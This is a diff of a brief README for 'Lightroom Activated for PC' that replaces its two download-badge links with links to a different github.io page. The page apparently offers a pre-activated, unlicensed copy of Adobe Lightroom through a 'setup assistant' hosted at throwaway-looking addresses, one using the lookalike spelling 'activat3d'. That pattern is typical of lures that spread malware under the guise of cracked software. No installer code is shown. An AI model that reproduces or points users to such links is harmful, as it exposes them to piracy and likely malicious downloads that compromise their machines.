@@ -1,7 +1,7 @@
 # 📷 Lightroom Activated for PC
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-darkblue?style=for-the-badge)](https://lightroom-activat3dforpc.github.io/.github/)  
-[![Get It Now](https://img.shields.io/badge/Get_It_Now-steelblue?style=for-the-badge&logo=adobelightroom)](https://lightroom-activat3dforpc.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-darkblue?style=for-the-badge)](https://gonzalezm285awesome.github.io/.github/lightroom-activate-for-pc)  
+[![Get It Now](https://img.shields.io/badge/Get_It_Now-steelblue?style=for-the-badge&logo=adobelightroom)](https://gonzalezm285awesome.github.io/.github/lightroom-activate-for-pc)
 
 ---
 
